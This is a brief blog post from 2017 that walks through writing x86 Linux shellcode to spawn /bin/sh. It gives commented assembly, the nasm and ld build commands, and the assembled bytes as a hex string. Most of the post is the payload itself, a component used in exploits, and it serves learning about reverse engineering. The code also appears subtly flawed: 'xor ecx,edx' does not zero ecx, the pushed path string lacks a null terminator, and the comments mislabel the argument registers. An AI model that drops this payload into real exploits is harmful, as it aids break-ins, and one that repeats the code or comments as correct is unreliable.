---
layout: post
title:  "Creating a simple /bin/sh shellcode"
date:   2017-09-17 01:51:00
categories: Reversing
---

It's a simple x86 shellcode to call /bin/sh, the initial code to undestand the sys_execve above have all the comments,

{% highlight Assembly %}
;section .data:
;	cmd: db "/bin/sh",0x0

section .text:
	global _start
	_start:
		push ebp		;prologo
		mov ebp,esp		;prologo
		sub esp,10		;reserve 10bytes on stack
		push 0x68732f6e		;send hs/n to stack
		push 0x69622f2f		;send ib// to stack
		xor eax,eax		;zero to eax
		add eax,0x0b		;add 0x0b on eax to call sys_execve(you can consult it on https://syscalls.kernelgrok.com/)
		mov ebx,esp		;mov //bin/sh(hs/nib//) to ebx
		xor edx,edx		;zero to edx first arg
		xor ecx,edx		;zero ecx second arg
		int 0x80		;kernel interrupt
{% endhighlight %}

compiler && linker
{% highlight Bash %}
nasm -f elf32 sh3llc0d3.asm && ld -o shell sh3llc0d3.o
{% endhighlight %}

29 bytes shellcode
{% highlight Bash %}
"\x55\x89\xE5\x83\xEC\x0A\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x31\xC0\x83\xC0\x0B\x89\xE3\x31\xD2\x31\xD1\xCD\x80"
{% endhighlight %}
